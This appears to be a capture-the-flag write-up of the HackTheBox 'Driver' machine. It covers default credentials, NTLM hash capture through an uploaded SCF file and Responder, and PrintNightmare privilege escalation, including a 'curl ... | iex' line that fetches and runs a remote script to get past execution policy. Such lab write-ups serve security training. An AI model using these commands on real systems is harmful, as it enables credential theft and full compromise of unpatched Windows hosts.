# Driver -- HackTheBox (write-up)

**Difficulty:** Easy
**Box:** Driver (HackTheBox)
**Author:** dsec
**Date:** 2025-08-12

---

## TL;DR

### Default creds on printer admin portal. SCF file upload to file share captured NTLM hash via Responder. Privesc via PrintNightmare (CVE-2021-1675).

---

## Target info

- Host: `10.129.x.x`
- Services discovered: `80/tcp (http)`, `445/tcp (smb)`, `5985/tcp (winrm)`

---

## Enumeration

Port 80 had a printer admin portal. Logged in with `admin:admin`.

---

## Foothold

The portal mentioned uploaded files go to a file share. Used `hashgrab.py` to create an SCF file:

```bash
python3 hashgrab.py 10.10.14.242 driver
```

Started Responder:

```bash
sudo responder -I tun0 -wv
```

Uploaded the SCF file:

![Hashgrab creation](images/driver-htb_1.png)

![Upload](images/driver-htb_2.png)

Captured NTLMv2 hash for `tony`. Cracked with hashcat:

![Cracked hash](images/driver-htb_3.png)

Validated with nxc:

![nxc validation](images/driver-htb_4.png)

Connected via evil-winrm:

![evil-winrm shell](images/driver-htb_5.png)

---

## Privilege escalation

Checked PowerShell history:

```powershell
type C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![PS history](images/driver-htb_6.png)

![Enumeration](images/driver-htb_7.png)

![Metasploit attempt](images/driver-htb_8.png)

**Metasploit ricoh_driver_privesc kept failing** -- meterpreter shell died each time even after migrating to explorer.exe.

**PrintNightmare (CVE-2021-1675):**

John Hammond's script didn't work. Execution policy blocked `Import-Module`. Bypass:

```powershell
curl http://10.10.14.242/CVE-2021-1675.ps1 -UseBasicParsing | iex
Invoke-Nightmare
```

![PrintNightmare success](images/driver-htb_9.png)

---

## Lessons & takeaways

- Default credentials on admin panels are always worth trying first
- SCF files in shared directories trigger NTLM authentication to attacker-controlled hosts
- When `Import-Module` is blocked by execution policy, pipe `curl | iex` as a bypass
- PrintNightmare (CVE-2021-1675) remains a reliable privesc on unpatched Windows hosts
---
